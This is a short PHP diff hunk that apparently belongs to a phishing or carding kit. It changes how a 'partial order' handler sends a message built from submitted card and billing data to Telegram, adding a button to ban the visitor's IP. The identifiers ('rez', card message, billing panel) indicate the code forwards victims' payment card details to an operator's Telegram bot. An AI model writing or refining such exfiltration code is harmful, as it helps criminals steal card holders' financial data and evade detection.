@@ -553,7 +553,7 @@ function notify_partial_order(array $data): bool
     require_once __DIR__ . '/panel-stats.php';
     panel_stats_record_billing($data);
 
-    return send_telegram_rez_with_ban(build_card_message($data, true), client_ip());
+    return send_telegram_message(build_card_message($data, true), 'billing', telegram_ban_ip_keyboard(client_ip()));
 }
 
 function client_ip(): string
